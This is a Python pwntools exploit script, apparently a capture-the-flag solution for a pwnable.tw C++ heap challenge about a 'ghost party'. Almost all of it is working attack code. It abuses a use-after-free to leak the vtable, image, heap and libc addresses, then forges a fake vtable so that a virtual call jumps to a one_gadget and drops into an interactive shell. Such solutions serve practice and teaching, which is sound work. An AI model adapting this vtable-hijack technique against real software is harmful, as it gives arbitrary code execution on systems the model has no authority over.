from pwn import *
import time

p = process("./a.out")
#p = remote("chall.pwnable.tw", 10401)
elf = ELF("./a.out")
#libc = ELF("./libc_64.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "info"

'''
-----------------
 1.Werewolf      
 2.Devil         
 3.Zombie        
 4.Skull         
 5.Mummy         
 6.Dullahan      
 7.Vampire       
 8.Yuki-onna     
 9.Kasa-obake    
 10.Alan         
-----------------
'''

# const
TYPE_WEREWOLF = 0x1
TYPE_DEVIL = 0x2
TYPE_ZOMBIE = 0x3
TYPE_SKULL = 0x4
TYPE_MUMMY = 0x5
TYPE_DULLAHAN = 0x6
TYPE_VAMPIRE = 0x7
TYPE_YUKI = 0x8
TYPE_KASA = 0x9
TYPE_ALAN = 0xa

ACTION_JOIN = 0x1
ACTION_GIVEUP = 0x2
ACTION_JOINANDSHOW = 0x3

vector_ghostlist_offset = 0x211030
libc_start_main_got_offset = 0x210E90

one_list_local = [0x45226, 0x4527a, 0xf0364, 0xf1207]
one_list_remote = [0x45216, 0x4526a, 0xef6c4, 0xf0567]

def _add_ghost(name, age:int, msg, ghost_type:int):
    p.sendafter(b"Your choice :", b"1\n")
    p.sendafter(b"Name : ", name+b"\n")
    p.sendafter(b"Age : ", str(age).encode()+b"\n")
    p.sendafter(b"Message : ", msg+b"\n")
    p.recvuntil(b"Choose a type of ghost :")
    p.sendline(str(ghost_type).encode())

def _do_action(action):
    p.sendafter(b"Your choice : ", str(action).encode()+b"\n")

def get_name_list():
    p.sendafter(b"Your choice :", b"2\n")

'''
1.Join       
2.Give up
3.Join and hear what the ghost say
'''

def add_werewolf(name, age:int, msg, full_moon:int, action:int):
    '''name, age:int, msg, full_moon:int, action:int'''
    _add_ghost(name, age, msg, TYPE_WEREWOLF)
    p.sendafter(b"Full moon ? (1:yes/0:no):", str(full_moon).encode()+b"\n")
    _do_action(action)

def add_devil(name, age:int, msg, power, action:int):
    '''name, age:int, msg, power, action:int'''
    _add_ghost(name, age, msg, TYPE_DEVIL)
    p.sendafter(b"Add power : ", power+b"\n")
    _do_action(action)

def add_zombie(name, age:int, msg, action:int):
    '''name, age:int, msg, action:int'''
    _add_ghost(name, age, msg, TYPE_ZOMBIE)
    _do_action(action)

def add_skull(name, age:int, msg, bones:int, action:int):
    '''name, age:int, msg, bones:int, action:int'''
    _add_ghost(name, age, msg, TYPE_SKULL)
    p.sendafter(b"How many bones ? : ", str(bones).encode()+b"\n")
    _do_action(action)

def add_mummy(name, age:int, msg, commit, action:int):
    '''name, age:int, msg, commit, action:int'''
    _add_ghost(name, age, msg, TYPE_MUMMY)
    p.sendafter(b"Commit on bandage : ", commit+b"\n")
    _do_action(action)

def add_dullahan(name, age:int, msg, weapon, action:int):
    '''name, age:int, msg, weapon, action:int'''
    _add_ghost(name, age, msg, TYPE_DULLAHAN)
    p.sendafter(b"Give a weapon : ", weapon+b"\n")
    _do_action(action)

def add_vampire(name, age:int, msg, blood, action:int):
    '''name, age:int, msg, blood, action:int'''
    _add_ghost(name, age, msg, TYPE_VAMPIRE)
    p.sendafter(b"Add blood :", blood+b"\n")
    _do_action(action)

def add_yuki(name, age:int, msg, cold, action:int):
    '''name, age:int, msg, cold, action:int'''
    _add_ghost(name, age, msg, TYPE_YUKI)
    p.sendafter(b"Cold :", cold+b"\n")
    _do_action(action)

def add_kasa(name, age:int, msg, foot:int, eyes, echo, action:int):
    '''name, age:int, msg, foot:int, eyes, echo, action:int'''
    _add_ghost(name, age, msg, TYPE_KASA)
    p.sendafter(b"foot number :", str(foot).encode()+b"\n")
    p.sendafter(b"Eyes : ", eyes+b"\n")
    p.sendafter(b"Input to echo :", echo)
    _do_action(action)

def add_alan(name, age:int, msg, lightsaber, action:int):
    '''name, age:int, msg, lightsaber, action:int'''
    _add_ghost(name, age, msg, TYPE_ALAN)
    p.sendafter(b"Your lightsaber : ", lightsaber+b"\n")
    _do_action(action)

def show_ghost(idx:int):
    p.sendafter(b"Your choice :", b"2\n")
    p.sendafter(b"which you want to show in the party : ", str(idx).encode()+b"\n")

def night():
    p.sendafter(b"Your choice :", b"3\n")

def rmghost(idx:int):
    p.sendafter(b"Your choice :", b"4\n")
    p.sendafter(b"which you want to remove from the party : ", str(idx).encode()+b"\n")

def end_party():
    p.sendafter(b"Your choice :", b"5\n")

def get_fake_werewolf_obj(vtable, ptr_to_leak):
    return (p64(vtable) + p64(0) + p64(ptr_to_leak)).ljust(0x5f, b"\x00")

def exp():
    # leak vtable && image_base
    add_vampire(name=b"AAAA", age=1, msg=b"aaaa", blood=b"a"*0x5f, action=ACTION_JOINANDSHOW) #0
    add_werewolf(name=b"BBBB", age=1, msg=b"bbb", full_moon=1, action=ACTION_JOINANDSHOW) #1
    show_ghost(0)
    p.recvuntil(b"Blood : ")
    vtable_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) # werewolf's vtable
    werewolf_vtable = vtable_leak
    image_base = vtable_leak - 0x210b98
    print("[*] vtable_leak:", hex(vtable_leak))
    print("[*] image_base:", hex(image_base))

    # leak heap
    ## deep free obj_0 && shallow free obj_1
    rmghost(0)
    vector_ghostlist = image_base + vector_ghostlist_offset
    fake_werewolf_obj = get_fake_werewolf_obj(werewolf_vtable, vector_ghostlist)
    add_mummy(name=b"CCCC", age=1, msg=fake_werewolf_obj, commit=b"leak", action=ACTION_JOINANDSHOW) #1
    show_ghost(0) # leak what name_ptr point to
    p.recvuntil(b"Name : ")
    heap_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    heap_base = heap_leak - 0x12d40
    print("[*] heap_leak:", hex(heap_leak))
    print("[*] heap_base:", hex(heap_base))

    # leak libc
    ## deep free obj_1 && shallow free obj_0
    rmghost(1)
    libc_start_main_got = image_base + libc_start_main_got_offset
    fake_werewolf_obj = get_fake_werewolf_obj(werewolf_vtable, libc_start_main_got)
    add_mummy(name=b"DDDD", age=1, msg=fake_werewolf_obj, commit=b"leak", action=ACTION_JOINANDSHOW) #1
    get_name_list()
    p.recvuntil(b": ")
    libc_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    libc_base = libc_leak - libc.symbols[b"__libc_start_main"]
    print("[*] libc_leak:", hex(libc_leak))
    print("[*] libc_base:", hex(libc_base))
    p.sendline(b"1")

    # attack vtable
    rmghost(1)
    fake_vtable_addr = heap_base + 0x12e40 + 0x8
    one_gadget = libc_base + one_list_remote[2]
    fake_vtable = p64(0)*2 + p64(one_gadget) # vtable+0x10 -> self.showinfo()
    fake_werewolf_obj = (p64(fake_vtable_addr) + fake_vtable).ljust(0x5f, b"\x00")
    add_mummy(name=b"EEEE", age=1, msg=fake_werewolf_obj, commit=b"shell", action=ACTION_JOINANDSHOW) #0/1

    # getshell
    p.sendline(b"2")
    p.sendline(b"0") # call self.showinfo() -> one_gadget to get shell

    #gdb.attach(p)
    p.interactive()

if __name__ == "__main__":
    exp()


